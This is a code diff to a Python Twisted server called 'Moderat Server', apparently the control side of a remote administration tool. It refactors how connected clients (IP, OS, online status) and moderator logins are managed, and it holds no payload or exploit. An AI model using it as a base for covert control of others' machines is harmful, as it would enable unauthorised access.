@@ -3,7 +3,6 @@ from twisted.internet import reactor
 
 from ClientsManagment import ClientsManagment
 from ModeratorsManagment import ModeratorsManagment
-from ModeratorsSessions import SessionsManagment
 
 import logging
 from logging.handlers import RotatingFileHandler
@@ -29,6 +28,10 @@ log.addHandler(ch)
 fh = logging.handlers.RotatingFileHandler(LOGFILE, maxBytes=(1048576*5), backupCount=7)
 fh.setFormatter(format)
 log.addHandler(fh)
+
+
+manageClients = ClientsManagment()
+manageModerators = ModeratorsManagment()
 
 
 def id_generator(size=12, chars=string.ascii_uppercase + string.digits):
@@ -88,8 +91,8 @@ class ModeratServerProtocol(Protocol):
             log.info('[*] New Client from %s' % self.transport.getHost())
 
             # Create Client DB Entry
-            self.factory.ManageClients.create_client('admin', client_id, self.transport.getHost().host)
-            self.factory.ManageClients.set_client_online(client_id)
+            manageClients.create_client('admin', client_id, self.transport.getHost().host)
+            manageClients.set_client_online(client_id)
 
         # Clients Status Checker
         elif mode == 'infoChecker':
@@ -118,9 +121,9 @@ class ModeratServerProtocol(Protocol):
                     command, username, password = data['payload'].split()
 
                     # If Login Success
-                    if self.factory.ManageModerators.login_user(username, password):
+                    if manageModerators.login_user(username, password):
 
-                        privileges = self.factory.ManageModerators.get_privs(username)
+                        privileges = manageModerators.get_privs(username)
 
                         log.info('Moderator (%s) Login Success' % username)
                         self.send_message_to_moderator(self, 'loginSuccess %s' % privileges, 'moderatorInitializing')
@@ -136,20 +139,17 @@ class ModeratServerProtocol(Protocol):
 
         # Check if session id is active
         elif data['mode'] == 'getClients' and data['session_id'] in moderators:
-            clients_ids = self.factory.ManageClients.get_clients(moderators[data['session_id']]['username'])
+            clients_ids = manageClients.get_clients(moderators[data['session_id']]['username'])
             shared_clients = {}
 
             # for online clients
             for client_id in clients_ids:
                 _id = client_id[0]
-                print _id
-                print clients
-                print clients.has_key(_id)
                 # Online Clients
                 if clients.has_key(_id):
                     shared_clients[_id] = {
-                        'moderator':            self.factory.ManageClients.get_moderator(_id),
-                        'alias':                self.factory.ManageClients.get_alias(_id),
+                        'moderator':            manageClients.get_moderator(_id),
+                        'alias':                manageClients.get_alias(_id),
                         'ip_address':           self.transport.getHost().host,
                         'os_type':              clients[_id]['os_type'],
                         'os':                   clients[_id]['os'],
@@ -165,16 +165,18 @@ class ModeratServerProtocol(Protocol):
                 # Offline Clients
                 else:
                     shared_clients[client_id] = {
-                        'moderator':    self.factory.ManageClients.get_moderator(_id),
+                        'moderator':    manageClients.get_moderator(_id),
                         'key':           _id,
-                        'alias':        self.factory.ManageClients.get_alias(_id),
-                        'ip_address':   self.factory.ManageClients.get_ip_address(_id),
-                        'last_online':  self.factory.ManageClients.get_last_online(_id),
+                        'alias':        manageClients.get_alias(_id),
+                        'ip_address':   manageClients.get_ip_address(_id),
+                        'last_online':  manageClients.get_last_online(_id),
                         'status':       False
                     }
 
             self.send_message_to_moderator(self, shared_clients, 'getClients')
 
+    def is_administrator(self, session_id):
+        print manageModerators.get_privs(moderators[session_id]['username'])
 
     def recieve_message(self, data, end='[ENDOFMESSAGE]'):
         return ast.literal_eval(data[:-len(end)].decode('utf-8'))
@@ -204,10 +206,6 @@ class ModeratServerFactory(ServerFactory):
     log.info('Moderat Server Started')
 
     protocol = ModeratServerProtocol
-
-    ManageClients = ClientsManagment()
-    ManageModerators = ModeratorsManagment()
-    ManageSessions = SessionsManagment()
 
     def __init__(self):
         pass
